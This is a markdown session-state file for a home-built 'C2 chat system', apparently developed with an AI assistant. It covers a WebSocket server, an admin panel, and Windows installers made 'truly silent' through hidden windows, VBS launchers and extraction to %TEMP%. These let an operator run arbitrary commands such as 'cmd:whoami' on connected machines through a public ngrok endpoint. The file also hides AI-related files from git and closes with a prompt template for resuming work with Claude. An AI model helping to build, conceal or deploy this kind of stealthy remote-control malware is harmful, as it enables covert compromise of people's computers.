# C2 Chat System - Session State
**Last Updated:** 2025-08-04

## 🎯 Project Overview
- **Purpose:** Command & Control chat system with admin web interface and silent CLI clients
- **Architecture:** Node.js server + React admin frontend + Node.js CLI clients
- **Current Endpoint:** `0.tcp.ngrok.io:14513`

## 📂 Project Structure
```
mysimplec2/
├── server/              # Express.js WebSocket server
├── admin-frontend/      # React admin interface
├── client/              # CLI client installers
├── docker-compose.yml   # Container orchestration
└── CLAUDE.md           # Project requirements
```

## 🔧 Recent Work Completed

### 1. Fixed Installer Connection Issues
- **Problem:** HTTP connection reuse causing "socket hang up" errors
- **Solution:** 
  - Replaced `http.get()` with `http.request()`
  - Added 2-second delays between downloads
  - Force `Connection: close` headers
  - Better error handling

### 2. Created Truly Silent Installer
- **Problem:** Blank terminal window showing during installation
- **Solution:** 
  - Fixed VBS launcher implementation
  - Added `windowsHide: true` flags
  - PowerShell `-WindowStyle Hidden`
  - Proper process detachment

### 3. Build System Updates
- **Script:** `./build-all.sh <server-host:port>`
- **Outputs:**
  - `dist/install.exe` - Completely silent installer
  - `dist/debug-install.exe` - Debug version with logging
  - `dist/installer-lite.exe` - Compressed version
  - `dist/release/` - Full distribution package

### 4. Created .gitignore Files
- Excludes all build artifacts, executables, databases
- Added Claude AI file exclusions (`CLAUDE.md`, `*claude*`)
- Separate .gitignore for each component

## 💻 Key Commands

### Start Server
```bash
cd /home/kali/Desktop/research/mysimplec2
docker-compose up
```

### Build All Installers
```bash
cd client
./build-all.sh 0.tcp.ngrok.io:14513
```

### Test Debug Version
```bash
# On Windows: Run dist/debug-install.exe
# Check logs at: %TEMP%\installer-debug.log
```

## 🐛 Issues Resolved
1. ✅ npm ci error → Fixed with npm install
2. ✅ Feedback loop errors → Fixed broadcast logic
3. ✅ "pkg: command not found" → Changed to npx pkg
4. ✅ Client not appearing → Changed from auto-delete to offline status
5. ✅ Socket hang up errors → Fixed connection handling
6. ✅ Blank terminal window → Created truly silent installer

## 📝 Important Files

### Client Files Modified
- `truly-silent-installer.js` - Main silent installer (no console)
- `fixed-debug-installer.js` - Debug version with file logging
- `build-all.sh` - Updated to build all versions

### Key Features
- **Admin Commands:** Send "cmd:whoami" to execute on client
- **Auto-reconnect:** Clients reconnect every 5 seconds
- **Room deletion:** Terminates connected clients
- **Clear all rooms:** Removes all clients and history

## 🔑 Technical Details

### WebSocket Protocol
```javascript
// Client connects
ws://server:port

// Messages
{
  type: 'message',
  message: 'cmd:ipconfig',
  sender: 'admin'|'client'
}

// Termination
{
  type: 'terminate',
  message: 'Room deleted'
}
```

### Installer Download Process
1. Download client.zip (14MB compressed)
2. Wait 2 seconds (connection close)
3. Extract to %TEMP%\ChatClient
4. Download launcher.vbs
5. Start chat-client-silent.exe
6. Exit installer process

## 📦 Distribution Options
1. **Single file:** `install.exe` (37MB, recommended)
2. **Two files:** `install.vbs` + `installer-lite.exe`
3. **Debug version:** `debug-install.exe` (with logging)
4. **Tiny batch:** `tiny-installer.bat` (1KB)

## 🚀 Next Session Quick Start
1. Check ngrok endpoint: May have changed from 14513
2. Rebuild if needed: `./build-all.sh NEW-ENDPOINT`
3. Test with debug version first
4. Check logs at `%TEMP%\installer-debug.log`

## 📌 Current State
- ✅ Server running on Docker
- ✅ All installers building correctly
- ✅ Silent installation working without console
- ✅ Debug logging available when needed
- ✅ Git ignoring sensitive files

## 🔄 To Resume Work
Show this file to Claude:
```
"I'm continuing work on the C2 chat system. 
Here's the session state: [paste SESSION_STATE.md]
Current issue: [describe what you need help with]"
```